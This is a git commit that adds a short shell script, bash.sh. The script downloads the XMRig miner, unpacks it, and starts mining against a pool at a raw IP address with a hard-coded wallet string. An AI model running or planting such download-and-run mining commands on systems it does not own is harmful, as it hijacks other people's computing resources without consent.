f772bf51b71fadd6c4be3daf29ab8981f8befe80
jinxy88 <jinxy1988@gmail.com>
2022-01-11 11:29:49 +0200

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
+./xmrig -o 159.65.25.23:3333 -a rx -k -u ELON:0xa4a231fBF53800d2208E824428f18CaAFbaAC4A9.testcpu8 -p x
